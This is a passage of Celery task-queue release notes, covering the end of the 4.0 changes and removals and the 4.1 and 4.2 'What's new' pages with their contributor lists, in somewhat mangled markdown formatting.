Beat `` ` ~~~~  - Fixed crontab infinite loop with invalid date.      When occurrence can never be reached (example, April, 31th), trying     to reach the next occurrence would trigger an infinite loop.      Try fixing that by raising a `RuntimeError` after 2,000 iterations      (Also added a test for crontab leap years in the process)      Fix contributed by **Romuald Brunet**.  - Now ensures the program exits with a non-zero exit code when an   exception terminates the service.      Fix contributed by **Simon Peeters**.  App ~~~  - Dates are now always timezone aware even if   :setting:`enable_utc` is disabled (Issue #943).      Fix contributed by **Omer Katz**.  - **Config**: App preconfiguration is now also pickled with the configuration.      Fix contributed by **Jeremy Zafran**.  - The application can now change how task names are generated using     the `~@gen_task_name` method.      Contributed by **Dmitry Malinovsky**.  - App has new ``app.current\_worker\_task``property that   returns the task that's currently being worked on (or `None`).   (Issue #2100).  Logging ~~~~~~~  - `~celery.utils.log.get_task_logger` now raises an exception   if trying to use the name "celery" or "celery.task" (Issue #3475).  Execution Pools ~~~~~~~~~~~~~~~  - **Eventlet/Gevent**: now enables AMQP heartbeat (Issue #3338).  - **Eventlet/Gevent**: Fixed race condition leading to "simultaneous read"   errors (Issue #2755).  - **Prefork**: Prefork pool now uses``poll`instead of`select``where   available (Issue #2373).  - **Prefork**: Fixed bug where the pool would refuse to shut down the   worker (Issue #2606).  - **Eventlet**: Now returns pool size in :program:`celery inspect stats`   command.      Contributed by **Alexander Oblovatniy**.  Testing -------  - Celery is now a :pypi:`pytest` plugin, including fixtures   useful for unit and integration testing.      See the [testing user guide <testing>](#testing-user-guide-<testing>) for more information.  Transports ~~~~~~~~~~  -``amqps://``can now be specified to require SSL.  - **Redis Transport**: The Redis transport now supports the   :setting:`broker_use_ssl` option.      Contributed by **Robert Kolba**.  - JSON serializer now calls``obj.\_\_json\_\_`for unsupported types.      This means you can now define a`\_\_json\_\_`method for custom     types that can be reduced down to a built-in json type.      Example:`\`python class Person: first\_name = None last\_name = None address = None

>   - def \_\_json\_\_(self):
>     
>       - return {  
>         'first\_name': self.first\_name, 'last\_name': self.last\_name, 'address': self.address,
>     
>     }

  - JSON serializer now handles datetime's, Django promise, UUID and Decimal.

  - New `Queue.consumer_arguments` can be used for the ability to set consumer priority via `x-priority`.
    
    See <https://www.rabbitmq.com/consumer-priority.html>
    
    Example:
    
    ``` python
    consumer = Consumer(channel, consumer_arguments={'x-priority': 3})
    ```

  - Queue/Exchange: `no_declare` option added (also enabled for internal amq. exchanges).

Programs `` ` ~~~~~~~~  - Celery is now using :mod:`argparse`, instead of :mod:`optparse`.  - All programs now disable colors if the controlling terminal is not a TTY.  - :program:`celery worker`: The ``-q``argument now disables the startup   banner.  - :program:`celery worker`: The "worker ready" message is now logged   using severity info, instead of warn.  - :program:`celery multi`:``%n`format for is now synonym with`%N``to be consistent with :program:`celery worker`.  - :program:`celery inspect`/:program:`celery control`: now supports a new   :option:`--json <celery inspect --json>` option to give output in json format.  - :program:`celery inspect registered`: now ignores built-in tasks.  - :program:`celery purge` now takes``-Q`and`-X``options   used to specify what queues to include and exclude from the purge.  - New :program:`celery logtool`: Utility for filtering and parsing   celery worker log-files  - :program:`celery multi`: now passes through `%i` and `%I` log   file formats.  - General:``%p``can now be used to expand to the full worker node-name   in log-file/pid-file arguments.  - A new command line option    :option:`--executable <celery worker --executable>` is now    available for daemonizing programs (:program:`celery worker` and    :program:`celery beat`).      Contributed by **Bert Vanderbauwhede**.  - :program:`celery worker`: supports new   :option:`--prefetch-multiplier <celery worker --prefetch-multiplier>` option.      Contributed by **Mickaël Penhard**.  - The``--loader``argument is now always effective even if an app argument is   set (Issue #3405).  - inspect/control now takes commands from registry      This means user remote-control commands can also be used from the     command-line.      Note that you need to specify the arguments/and type of arguments     for the arguments to be correctly passed on the command-line.      There are now two decorators, which use depends on the type of     command: `@inspect_command` + `@control_command`:``\`python from celery.worker.control import control\_command

>   - @control\_command(  
>     args=\[('n', int)\] signature='\[N=1\]',
> 
> ) def something(state, n=1, \*\*kwargs): ...
> 
> Here `args` is a list of args supported by the command. The list must contain tuples of `(argument_name, type)`.
> 
> `signature` is just the command-line help used in e.g. `celery -A proj control --help`.
> 
> Commands also support <span class="title-ref">variadic</span> arguments, which means that any arguments left over will be added to a single variable. Here demonstrated by the `terminate` command which takes a signal argument and a variable number of task\_ids:
> 
> ``` python
> ```
> 
> from celery.worker.control import control\_command
> 
>   - @control\_command(  
>     args=\[('signal', str)\], signature='\<signal\> \[id1, \[id2, \[..., \[idN\]\]\]\]', variadic='ids',
> 
> ) def terminate(state, signal, ids, \*\*kwargs): ...
> 
> This command can now be called using:
> 
> ``` console
> ```
> 
> $ celery -A proj control terminate SIGKILL id1 id2 id3\`
> 
> See \[worker-custom-control-commands\](\#worker-custom-control-commands) for more information.

Worker `` ` ~~~~~~  - Improvements and fixes for `~celery.utils.collections.LimitedSet`.      Getting rid of leaking memory + adding ``minlen`size of the set:     the minimal residual size of the set after operating for some time.`minlen``items are kept, even if they should've been expired.      Problems with older and even more old code:      #. Heap would tend to grow in some scenarios        (like adding an item multiple times).      #. Adding many items fast wouldn't clean them soon enough (if ever).      #. When talking to other workers, revoked._data was sent, but        it was processed on the other side as iterable.        That means giving those keys new (current)        time-stamp. By doing this workers could recycle        items forever. Combined with 1) and 2), this means that in        large set of workers, you're getting out of memory soon.      All those problems should be fixed now.      This should fix issues #3095, #3086.      Contributed by **David Pravec**.  - New settings to control remote control command queues.      - :setting:`control_queue_expires`          Set queue expiry time for both remote control command queues,         and remote control reply queues.      - :setting:`control_queue_ttl`          Set message time-to-live for both remote control command queues,         and remote control reply queues.      Contributed by **Alan Justino**.  - The :signal:`worker_shutdown` signal is now always called during shutdown.      Previously it would not be called if the worker instance was collected     by gc first.  - Worker now only starts the remote control command consumer if the   broker transport used actually supports them.  - Gossip now sets``x-message-ttl`for event queue to heartbeat_interval s.   (Issue #2005).  - Now preserves exit code (Issue #2024).  - Now rejects messages with an invalid ETA value (instead of ack, which means   they will be sent to the dead-letter exchange if one is configured).  - Fixed crash when the`-purge`argument was used.  - Log--level for unrecoverable errors changed from`error`to`critical`.  - Improved rate limiting accuracy.  - Account for missing timezone information in task expires field.      Fix contributed by **Albert Wang**.  - The worker no longer has a`Queues``bootsteps, as it is now     superfluous.  - Now emits the "Received task" line even for revoked tasks.   (Issue #3155).  - Now respects :setting:`broker_connection_retry` setting.      Fix contributed by **Nat Williams**.  - New :setting:`control_queue_ttl` and :setting:`control_queue_expires`   settings now enables you to configure remote control command   message TTLs, and queue expiry time.      Contributed by **Alan Justino**.  - New `celery.worker.state.requests` enables O(1) loookup   of active/reserved tasks by id.  - Auto-scale didn't always update keep-alive when scaling down.      Fix contributed by **Philip Garnero**.  - Fixed typo``options\_list`->`option\_list`.      Fix contributed by **Greg Wilbur**.  - Some worker command-line arguments and`Worker()`class arguments have   been renamed for consistency.      All of these have aliases for backward compatibility.      -`--send-events`->`--task-events`-`--schedule`->`--schedule-filename`-`--maxtasksperchild`->`--max-tasks-per-child`-`Beat(scheduler\_cls=)`->`Beat(scheduler=)`-`Worker(send\_events=True)`->`Worker(task\_events=True)`-`Worker(task\_time\_limit=)`->`Worker(time\_limit=`)      -`Worker(task\_soft\_time\_limit=)`->`Worker(soft\_time\_limit=)`-`Worker(state\_db=)`->`Worker(statedb=)`-`Worker(working\_directory=)`->`Worker(workdir=)``Debugging Utilities ~~~~~~~~~~~~~~~~~~~  - :mod:`celery.contrib.rdb`: Changed remote debugger banner so that you can copy and paste   the address easily (no longer has a period in the address).      Contributed by **Jonathan Vanasco**.  - Fixed compatibility with recent :pypi:`psutil` versions (Issue #3262).   Signals ~~~~~~~  - **App**: New signals for app configuration/finalization:      - `app.on_configure <@on_configure>`     - `app.on_after_configure <@on_after_configure>`     - `app.on_after_finalize <@on_after_finalize>`  - **Task**: New task signals for rejected task messages:      - `celery.signals.task_rejected`.     - `celery.signals.task_unknown`.  - **Worker**: New signal for when a heartbeat event is sent.      - `celery.signals.heartbeat_sent`          Contributed by **Kevin Richardson**.  Events ~~~~~~  - Event messages now uses the RabbitMQ``x-message-ttl``option   to ensure older event messages are discarded.      The default is 5 seconds, but can be changed using the     :setting:`event_queue_ttl` setting.  -``Task.send\_event``now automatically retries sending the event   on connection failure, according to the task publish retry settings.  - Event monitors now sets the :setting:`event_queue_expires`   setting by default.      The queues will now expire after 60 seconds after the monitor stops     consuming from it.  - Fixed a bug where a None value wasn't handled properly.      Fix contributed by **Dongweiming**.  - New :setting:`event_queue_prefix` setting can now be used   to change the default``celeryev`queue prefix for event receiver queues.      Contributed by **Takeshi Kanemoto**.  -`State.tasks\_by\_type`and`State.tasks\_by\_worker``can now be   used as a mapping for fast access to this information.  Deployment ~~~~~~~~~~  - Generic init-scripts now support   :envvar:`CELERY_SU` and :envvar:`CELERYD_SU_ARGS` environment variables   to set the path and arguments for :command:`su` (:manpage:`su(1)`).  - Generic init-scripts now better support FreeBSD and other BSD   systems by searching :file:`/usr/local/etc/` for the configuration file.      Contributed by **Taha Jahangir**.  - Generic init-script: Fixed strange bug for``celerybeat``where   restart didn't always work (Issue #3018).  - The systemd init script now uses a shell when executing   services.      Contributed by **Tomas Machalek**.  Result Backends ~~~~~~~~~~~~~~~  - Redis: Now has a default socket timeout of 120 seconds.      The default can be changed using the new :setting:`redis_socket_timeout`     setting.      Contributed by **Raghuram Srinivasan**.  - RPC Backend result queues are now auto delete by default (Issue #2001).  - RPC Backend: Fixed problem where exception   wasn't deserialized properly with the json serializer (Issue #2518).      Fix contributed by **Allard Hoeve**.  - CouchDB: The backend used to double-json encode results.      Fix contributed by **Andrew Stewart**.  - CouchDB: Fixed typo causing the backend to not be found   (Issue #3287).      Fix contributed by **Andrew Stewart**.  - MongoDB: Now supports setting the :setting:`result_serialzier` setting   to``bson``to use the MongoDB libraries own serializer.      Contributed by **Davide Quarta**.  - MongoDB: URI handling has been improved to use     database name, user and password from the URI if provided.      Contributed by **Samuel Jaillet**.  - SQLAlchemy result backend: Now ignores all result   engine options when using NullPool (Issue #1930).  - SQLAlchemy result backend: Now sets max char size to 155 to deal   with brain damaged MySQL Unicode implementation (Issue #1748).  - **General**: All Celery exceptions/warnings now inherit from common   `~celery.exceptions.CeleryError`/`~celery.exceptions.CeleryWarning`.   (Issue #2643).  Documentation Improvements ~~~~~~~~~~~~~~~~~~~~~~~~~~  Contributed by:  - Adam Chainz - Amir Rustamzadeh - Arthur Vuillard - Batiste Bieler - Berker Peksag - Bryce Groff - Daniel Devine - Edward Betts - Jason Veatch - Jeff Widman - Maciej Obuchowski - Manuel Kaufmann - Maxime Beauchemin - Mitchel Humpherys - Pavlo Kapyshin - Pierre Fersing - Rik - Steven Sklar - Tayfun Sen - Wieland Hoffmann  Reorganization, Deprecations, and Removals ==========================================  Incompatible changes --------------------  - Prefork: Calling``result.get()``or joining any result from within a task   now raises `RuntimeError`.      In previous versions this would emit a warning.  - :mod:`celery.worker.consumer` is now a package, not a module.  - Module``celery.worker.job``renamed to :mod:`celery.worker.request`.  - Beat:``Scheduler.Publisher`/`.publisher`renamed to`.Producer`/`.producer``.  - Result: The task_name argument/attribute of `@AsyncResult` was   removed.      This was historically a field used for :mod:`pickle` compatibility,     but is no longer needed.  - Backends: Arguments named``status`renamed to`state`.  - Backends:`backend.get\_status()`renamed to`backend.get\_state()`.  - Backends:`backend.maybe\_reraise()`renamed to`.maybe\_throw()``The promise API uses .throw(), so this change was made to make it more     consistent.      There's an alias available, so you can still use maybe_reraise until     Celery 5.0.  .. _v400-unscheduled-removals:  Unscheduled Removals --------------------  - The experimental :mod:`celery.contrib.methods` feature has been removed,   as there were far many bugs in the implementation to be useful.  - The CentOS init-scripts have been removed.      These didn't really add any features over the generic init-scripts,     so you're encouraged to use them instead, or something like     :pypi:`supervisor`.   .. _v400-deprecations-reorg:  Reorganization Deprecations ---------------------------  These symbols have been renamed, and while there's an alias available in this version for backward compatibility, they will be removed in Celery 5.0, so make sure you rename these ASAP to make sure it won't break for that release.  Chances are that you'll only use the first in this list, but you never know:  -``celery.utils.worker\_direct``->   `celery.utils.nodenames.worker_direct`.  -``celery.utils.nodename``-> `celery.utils.nodenames.nodename`.  -``celery.utils.anon\_nodename``->   `celery.utils.nodenames.anon_nodename`.  -``celery.utils.nodesplit``-> `celery.utils.nodenames.nodesplit`.  -``celery.utils.default\_nodename``->   `celery.utils.nodenames.default_nodename`.  -``celery.utils.node\_format``-> `celery.utils.nodenames.node_format`.  -``celery.utils.host\_format``-> `celery.utils.nodenames.host_format`.  .. _v400-removals:  Scheduled Removals ------------------  Modules ~~~~~~~  - Module``celery.worker.job``has been renamed to :mod:`celery.worker.request`.      This was an internal module so shouldn't have any effect.     It's now part of the public API so must not change again.  - Module``celery.task.trace`has been renamed to`celery.app.trace`as the`celery.task``package is being phased out. The module   will be removed in version 5.0 so please change any import from::      from celery.task.trace import X    to::      from celery.app.trace import X  - Old compatibility aliases in the :mod:`celery.loaders` module   has been removed.      - Removed``celery.loaders.current\_loader()`, use:`current\_app.loader`- Removed`celery.loaders.load\_settings()`, use:`current\_app.conf`Result ~~~~~~  -`AsyncResult.serializable()`and`celery.result.from\_serializable`has been removed:      Use instead:`\`pycon \>\>\> tup = result.as\_tuple() \>\>\> from celery.result import result\_from\_tuple \>\>\> result = result\_from\_tuple(tup)

  - Removed `BaseAsyncResult`, use `AsyncResult` for instance checks instead.

  - Removed `TaskSetResult`, use `GroupResult` instead.
    
    >   - `TaskSetResult.total` -\> `len(GroupResult)`
    >   - `TaskSetResult.taskset_id` -\> `GroupResult.id`

  - Removed `ResultSet.subtasks`, use `ResultSet.results` instead.

TaskSet `` ` ~~~~~~~  TaskSet has been removed, as it was replaced by the ``group`construct in Celery 3.0.  If you have code like this:`\`pycon \>\>\> from celery.task import TaskSet

> \>\>\> TaskSet(add.subtask((i, i)) for i in xrange(10)).apply\_async()

You need to replace that with:

``` pycon
>>> from celery import group
>>> group(add.s(i, i) for i in xrange(10))()
```

Events `` ` ~~~~~~  - Removals for class `celery.events.state.Worker`:      - ``Worker.\_defaults`attribute.          Use`{k: getattr(worker, k) for k in worker.\_fields}`.      -`Worker.update\_heartbeat`Use`Worker.event(None, timestamp, received)`-`Worker.on\_online`Use`Worker.event('online', timestamp, received, fields)`-`Worker.on\_offline`Use`Worker.event('offline', timestamp, received, fields)`-`Worker.on\_heartbeat`Use`Worker.event('heartbeat', timestamp, received, fields)``- Removals for class `celery.events.state.Task`:      -``Task.\_defaults`attribute.          Use`{k: getattr(task, k) for k in task.\_fields}`.      -`Task.on\_sent`Use`Worker.event('sent', timestamp, received, fields)`-`Task.on\_received`Use`Task.event('received', timestamp, received, fields)`-`Task.on\_started`Use`Task.event('started', timestamp, received, fields)`-`Task.on\_failed`Use`Task.event('failed', timestamp, received, fields)`-`Task.on\_retried`Use`Task.event('retried', timestamp, received, fields)`-`Task.on\_succeeded`Use`Task.event('succeeded', timestamp, received, fields)`-`Task.on\_revoked`Use`Task.event('revoked', timestamp, received, fields)`-`Task.on\_unknown\_event`Use`Task.event(short\_type, timestamp, received, fields)`-`Task.update`Use`Task.event(short\_type, timestamp, received, fields)`-`Task.merge`Contact us if you need this.  Magic keyword arguments ~~~~~~~~~~~~~~~~~~~~~~~  Support for the very old magic keyword arguments accepted by tasks is finally removed in this version.  If you're still using these you have to rewrite any task still using the old`celery.decorators`module and depending on keyword arguments being passed to the task, for example::      from celery.decorators import task      @task()     def add(x, y, task_id=None):         print('My task id is %r' % (task_id,))  should be rewritten into::      from celery import task      @task(bind=True)     def add(self, x, y):         print('My task id is {0.request.id}'.format(self))  Removed Settings ----------------  The following settings have been removed, and is no longer supported:  Logging Settings ~~~~~~~~~~~~~~~~  =====================================  ===================================== **Setting name**                       **Replace with** =====================================  =====================================`CELERYD\_LOG\_LEVEL`` :option:`celery worker --loglevel` ``CELERYD\_LOG\_FILE`` :option:`celery worker --logfile` ``CELERYBEAT\_LOG\_LEVEL`` :option:`celery beat --loglevel` ``CELERYBEAT\_LOG\_FILE`` :option:`celery beat --logfile` ``CELERYMON\_LOG\_LEVEL`celerymon is deprecated, use flower`CELERYMON\_LOG\_FILE`celerymon is deprecated, use flower`CELERYMON\_LOG\_FORMAT`celerymon is deprecated, use flower =====================================  =====================================  Task Settings ~~~~~~~~~~~~~~  =====================================  ===================================== **Setting name**                       **Replace with** =====================================  =====================================`CELERY\_CHORD\_PROPAGATES`N/A =====================================  =====================================  Changes to internal API -----------------------  - Module`celery.datastructures``renamed to :mod:`celery.utils.collections`.  - Module``celery.utils.timeutils``renamed to :mod:`celery.utils.time`.  -``celery.utils.datastructures.DependencyGraph``moved to   :mod:`celery.utils.graph`.  -``celery.utils.jsonify``is now `celery.utils.serialization.jsonify`.  -``celery.utils.strtobool``is now   `celery.utils.serialization.strtobool`.  -``celery.utils.is\_iterable`has been removed.      Instead use:`\`python isinstance(x, collections.Iterable)

  - `celery.utils.lpmerge` is now <span class="title-ref">celery.utils.collections.lpmerge</span>.
  - `celery.utils.cry` is now <span class="title-ref">celery.utils.debug.cry</span>.
  - `celery.utils.isatty` is now <span class="title-ref">celery.platforms.isatty</span>.
  - `celery.utils.gen_task_name` is now <span class="title-ref">celery.utils.imports.gen\_task\_name</span>.
  - `celery.utils.deprecated` is now <span class="title-ref">celery.utils.deprecated.Callable</span>
  - `celery.utils.deprecated_property` is now <span class="title-ref">celery.utils.deprecated.Property</span>.
  - `celery.utils.warn_deprecated` is now <span class="title-ref">celery.utils.deprecated.warn</span>

<div id="v400-deprecations">

Deprecation Time-line Changes \`\`\` =============================

</div>

See the \[deprecation-timeline\](\#deprecation-timeline).

---

whatsnew-4.1.md

---

# What's new in Celery 4.1 (latentcall)

  - Author  
    Omer Katz (`omer.drow at gmail.com`)

<div class="sidebar">

**Change history**

What's new documents describe the changes in major versions, we also have a \[changelog\](\#changelog) that lists the changes in bugfix releases (0.0.x), while older series are archived under the \[history\](\#history) section.

</div>

Celery is a simple, flexible, and reliable distributed system to process vast amounts of messages, while providing operations with the tools required to maintain such a system.

It's a task queue with focus on real-time processing, while also supporting task scheduling.

Celery has a large and diverse community of users and contributors, you should come join us \[on IRC \<irc-channel\>\](\#on-irc-\<irc-channel\>) or \[our mailing-list \<mailing-list\>\](\#our-mailing-list-\<mailing-list\>).

To read more about Celery you should go read the \[introduction \<intro\>\](\#introduction-\<intro\>).

While this version is backward compatible with previous versions it's important that you read the following section.

This version is officially supported on CPython 2.7, 3.4, 3.5 & 3.6 and is also supported on PyPy.

<div class="topic">

**Table of Contents**

Make sure you read the important notes before upgrading to this version.

</div>

<div class="contents" data-local="" data-depth="2">

</div>

## Preface

The 4.1.0 release continues to improve our efforts to provide you with the best task execution platform for Python.

This release is mainly a bug fix release, ironing out some issues and regressions found in Celery 4.0.0.

We added official support for Python 3.6 and PyPy 5.8.0.

This is the first time we release without Ask Solem as an active contributor. We'd like to thank him for his hard work in creating and maintaining Celery over the years.

Since Ask Solem was not involved there were a few kinks in the release process which we promise to resolve in the next release. This document was missing when we did release Celery 4.1.0. Also, we did not update the release codename as we should have. We apologize for the inconvenience.

For the time being, I, Omer Katz will be the release manager.

Thank you for your support\!

*— Omer Katz*

### Wall of Contributors

Acey \<<huiwang.e@gmail.com>\> Acey9 \<<huiwang.e@gmail.com>\> Alan Hamlett \<<alanhamlett@users.noreply.github.com>\> Alan Justino da Silva \<<alan.justino@yahoo.com.br>\> Alejandro Pernin \<<ale.pernin@gmail.com>\> Alli \<<alzeih@users.noreply.github.com>\> Andreas Pelme \<<andreas@pelme.se>\> Andrew de Quincey \<<adq@lidskialf.net>\> Anthony Lukach \<<anthonylukach@gmail.com>\> Arcadiy Ivanov \<<arcadiy@ivanov.biz>\> Arnaud Rocher \<<cailloumajor@users.noreply.github.com>\> Arthur Vigil \<<ahvigil@mail.sfsu.edu>\> Asif Saifuddin Auvi \<<auvipy@users.noreply.github.com>\> Ask Solem \<<ask@celeryproject.org>\> BLAGA Razvan-Paul \<<razvan.paul.blaga@gmail.com>\> Brendan MacDonell \<<macdonellba@gmail.com>\> Brian Luan \<<jznight@gmail.com>\> Brian May \<<brian@linuxpenguins.xyz>\> Bruno Alla \<<browniebroke@users.noreply.github.com>\> Chris Kuehl \<<chris@techxonline.net>\> Christian \<<github@penpal4u.net>\> Christopher Hoskin \<<mans0954@users.noreply.github.com>\> Daniel Hahler \<<github@thequod.de>\> Daniel Huang \<<dxhuang@gmail.com>\> Derek Harland \<<donkopotamus@users.noreply.github.com>\> Dmytro Petruk \<<bavaria95@gmail.com>\> Ed Morley \<<edmorley@users.noreply.github.com>\> Eric Poelke \<<epoelke@gmail.com>\> Felipe \<<fcoelho@users.noreply.github.com>\> François Voron \<<fvoron@gmail.com>\> GDR\! \<<gdr@gdr.name>\> George Psarakis \<<giwrgos.psarakis@gmail.com>\> J Alan Brogan \<<jalanb@users.noreply.github.com>\> James Michael DuPont \<<JamesMikeDuPont@gmail.com>\> Jamie Alessio \<<jamie@stoic.net>\> Javier Domingo Cansino \<<javierdo1@gmail.com>\> Jay McGrath \<<jaymcgrath@users.noreply.github.com>\> Jian Yu \<<askingyj@gmail.com>\> Joey Wilhelm \<<tarkatronic@gmail.com>\> Jon Dufresne \<<jon.dufresne@gmail.com>\> Kalle Bronsen \<<bronsen@nrrd.de>\> Kirill Romanov \<<djaler1@gmail.com>\> Laurent Peuch \<<cortex@worlddomination.be>\> Luke Plant \<<L.Plant.98@cantab.net>\> Marat Sharafutdinov \<<decaz89@gmail.com>\> Marc Gibbons \<<marc_gibbons@rogers.com>\> Marc Hörsken \<<mback2k@users.noreply.github.com>\> Michael \<<michael-k@users.noreply.github.com>\> Michael Howitz \<<mh@gocept.com>\> Michal Kuffa \<<beezz@users.noreply.github.com>\> Mike Chen \<<yi.chen.it@gmail.com>\> Mike Helmick \<<michaelhelmick@users.noreply.github.com>\> Morgan Doocy \<<morgan@doocy.net>\> Moussa Taifi \<<moutai10@gmail.com>\> Omer Katz \<<omer.drow@gmail.com>\> Patrick Cloke \<<clokep@users.noreply.github.com>\> Peter Bittner \<<django@bittner.it>\> Preston Moore \<<prestonkmoore@gmail.com>\> Primož Kerin \<<kerin.primoz@gmail.com>\> Pysaoke \<<pysaoke@gmail.com>\> Rick Wargo \<<rickwargo@users.noreply.github.com>\> Rico Moorman \<<rico.moorman@gmail.com>\> Roman Sichny \<<roman@sichnyi.com>\> Ross Patterson \<<me@rpatterson.net>\> Ryan Hiebert \<<ryan@ryanhiebert.com>\> Rémi Marenco \<<remi.marenco@gmail.com>\> Salvatore Rinchiera \<<srinchiera@college.harvard.edu>\> Samuel Dion-Girardeau \<<samuel.diongirardeau@gmail.com>\> Sergey Fursov \<<GeyseR85@gmail.com>\> Simon Legner \<<Simon.Legner@gmail.com>\> Simon Schmidt \<<schmidt.simon@gmail.com>\> Slam \<<3lnc.slam@gmail.com>\> Static \<<staticfox@staticfox.net>\> Steffen Allner \<<sa@gocept.com>\> Steven \<<rh0dium@users.noreply.github.com>\> Steven Johns \<<duoi@users.noreply.github.com>\> Tamer Sherif \<<tamer.sherif@flyingelephantlab.com>\> Tao Qingyun \<<845767657@qq.com>\> Tayfun Sen \<<totayfun@gmail.com>\> Taylor C. Richberger \<<taywee@gmx.com>\> Thierry RAMORASOAVINA \<<thierry.ramorasoavina@orange.com>\> Tom 'Biwaa' Riat \<<riat.tom@gmail.com>\> Viktor Holmqvist \<<viktorholmqvist@gmail.com>\> Viraj \<<vnavkal0@gmail.com>\> Vivek Anand \<<vivekanand1101@users.noreply.github.com>\> Will \<<paradox41@users.noreply.github.com>\> Wojciech Żywno \<<w.zywno@gmail.com>\> Yoichi NAKAYAMA \<<yoichi.nakayama@gmail.com>\> YuLun Shih \<<shih@yulun.me>\> Yuhannaa \<<yuhannaa@gmail.com>\> abhinav nilaratna \<<anilaratna2@bloomberg.net>\> aydin \<<adigeaydin@gmail.com>\> csfeathers \<<csfeathers@users.noreply.github.com>\> georgepsarakis \<<giwrgos.psarakis@gmail.com>\> orf \<<tom@tomforb.es>\> shalev67 \<<shalev67@gmail.com>\> sww \<<sww@users.noreply.github.com>\> tnir \<<tnir@users.noreply.github.com>\> 何翔宇(Sean Ho) \<<h1x2y3awalm@gmail.com>\>

\> **Note** \> This wall was automatically generated from git history, so sadly it doesn't not include the people who help with more important things like answering mailing-list questions.

## Important Notes

### Added support for Python 3.6 & PyPy 5.8.0

We now run our unit test suite and integration test suite on Python 3.6.x and PyPy 5.8.0.

We expect newer versions of PyPy to work but unfortunately we do not have the resources to test PyPy with those versions.

The supported Python Versions are:

  - CPython 2.7
  - CPython 3.4
  - CPython 3.5
  - CPython 3.6
  - PyPy 5.8 (`pypy2`)

## News

### Result Backends

#### New DynamoDB Results Backend

We added a new results backend for those of you who are using DynamoDB.

If you are interested in using this results backend, refer to \[conf-dynamodb-result-backend\](\#conf-dynamodb-result-backend) for more information.

#### Elasticsearch

The Elasticsearch results backend is now more robust and configurable.

See \[conf-elasticsearch-result-backend\](\#conf-elasticsearch-result-backend) for more information about the new configuration options.

#### Redis

The Redis results backend can now use TLS to encrypt the communication with the Redis database server.

See \[conf-redis-result-backend\](\#conf-redis-result-backend).

#### MongoDB

The MongoDB results backend can now handle binary-encoded task results.

This was a regression from 4.0.0 which resulted in a problem using serializers such as MsgPack or Pickle in conjunction with the MongoDB results backend.

### Periodic Tasks

The task schedule now updates automatically when new tasks are added. Now if you use the Django database scheduler, you can add and remove tasks from the schedule without restarting Celery beat.

### Tasks

The `disable_sync_subtasks` argument was added to allow users to override disabling synchronous subtasks.

See \[task-synchronous-subtasks\](\#task-synchronous-subtasks)

### Canvas

Multiple bugs were resolved resulting in a much smoother experience when using Canvas.

---

whatsnew-4.2.md

---

# What's new in Celery 4.2 (windowlicker)

  - Author  
    Omer Katz (`omer.drow at gmail.com`)

<div class="sidebar">

**Change history**

What's new documents describe the changes in major versions, we also have a \[changelog\](\#changelog) that lists the changes in bugfix releases (0.0.x), while older series are archived under the \[history\](\#history) section.

</div>

Celery is a simple, flexible, and reliable distributed system to process vast amounts of messages, while providing operations with the tools required to maintain such a system.

It's a task queue with focus on real-time processing, while also supporting task scheduling.

Celery has a large and diverse community of users and contributors, you should come join us \[on IRC \<irc-channel\>\](\#on-irc-\<irc-channel\>) or \[our mailing-list \<mailing-list\>\](\#our-mailing-list-\<mailing-list\>).

To read more about Celery you should go read the \[introduction \<intro\>\](\#introduction-\<intro\>).

While this version is backward compatible with previous versions it's important that you read the following section.

This version is officially supported on CPython 2.7, 3.4, 3.5 & 3.6 and is also supported on PyPy.

<div class="topic">

**Table of Contents**

Make sure you read the important notes before upgrading to this version.

</div>

<div class="contents" data-local="" data-depth="2">

</div>

## Preface

The 4.2.0 release continues to improve our efforts to provide you with the best task execution platform for Python.

This release is mainly a bug fix release, ironing out some issues and regressions found in Celery 4.0.0.

Traditionally, releases were named after [Autechre](https://en.wikipedia.org/wiki/Autechre)'s track names. This release continues this tradition in a slightly different way. Each major version of Celery will use a different artist's track names as codenames.

From now on, the 4.x series will be codenamed after [Aphex Twin](https://en.wikipedia.org/wiki/Aphex_Twin)'s track names. This release is codenamed after his very famous track, [Windowlicker](https://youtu.be/UBS4Gi1y_nc?t=4m).

Thank you for your support\!

*— Omer Katz*

### Wall of Contributors

Aaron Harnly \<<aharnly@wgen.net>\> Aaron Harnly \<<github.com@bulk.harnly.net>\> Aaron McMillin \<<github@aaron.mcmillinclan.org>\> Aaron Ross \<<aaronelliotross@gmail.com>\> Aaron Ross \<<aaron@wawd.com>\> Aaron Schumacher \<<ajschumacher@gmail.com>\> abecciu \<<augusto@becciu.org>\> abhinav nilaratna \<<anilaratna2@bloomberg.net>\> Acey9 \<<huiwang.e@gmail.com>\> Acey \<<huiwang.e@gmail.com>\> aclowes \<<aclowes@gmail.com>\> Adam Chainz \<<adam@adamj.eu>\> Adam DePue \<<adepue@hearsaycorp.com>\> Adam Endicott \<<adam@zoey.local>\> Adam Renberg \<<tgwizard@gmail.com>\> Adam Venturella \<<aventurella@gmail.com>\> Adaptification \<<Adaptification@users.noreply.github.com>\> Adrian \<<adrian@planetcoding.net>\> adriano petrich \<<petrich@gmail.com>\> Adrian Rego \<<arego320@gmail.com>\> Adrien Guinet \<<aguinet@quarkslab.com>\> Agris Ameriks \<<ameriks@gmail.com>\> Ahmet Demir \<<ahmet2mir+github@gmail.com>\> air-upc \<<xin.shli@ele.me>\> Aitor Gómez-Goiri \<<aitor@gomezgoiri.net>\> Akira Matsuzaki \<<akira.matsuzaki.1977@gmail.com>\> Akshar Raaj \<<akshar@agiliq.com>\> Alain Masiero \<<amasiero@ocs.online.net>\> Alan Hamlett \<<alan.hamlett@prezi.com>\> Alan Hamlett \<<alanhamlett@users.noreply.github.com>\> Alan Justino \<<alan.justino@yahoo.com.br>\> Alan Justino da Silva \<<alan.justino@yahoo.com.br>\> Albert Wang \<<albert@zerocater.com>\> Alcides Viamontes Esquivel \<<a.viamontes.esquivel@gmail.com>\> Alec Clowes \<<aclowes@gmail.com>\> Alejandro Pernin \<<ale.pernin@gmail.com>\> Alejandro Varas \<<alej0varas@gmail.com>\> Aleksandr Kuznetsov \<<aku.ru.kz@gmail.com>\> Ales Zoulek \<<ales.zoulek@gmail.com>\> Alexander \<<a.a.lebedev@gmail.com>\> Alexander A. Sosnovskiy \<<alecs.box@gmail.com>\> Alexander Koshelev \<<daevaorn@gmail.com>\> Alexander Koval \<<kovalidis@gmail.com>\> Alexander Oblovatniy \<<oblalex@users.noreply.github.com>\> Alexander Oblovatniy \<<oblovatniy@gmail.com>\> Alexander Ovechkin \<<frostoov@gmail.com>\> Alexander Smirnov \<<asmirnov@five9.com>\> Alexandru Chirila \<<alex@alexkiro.com>\> Alexey Kotlyarov \<<alexey@infoxchange.net.au>\> 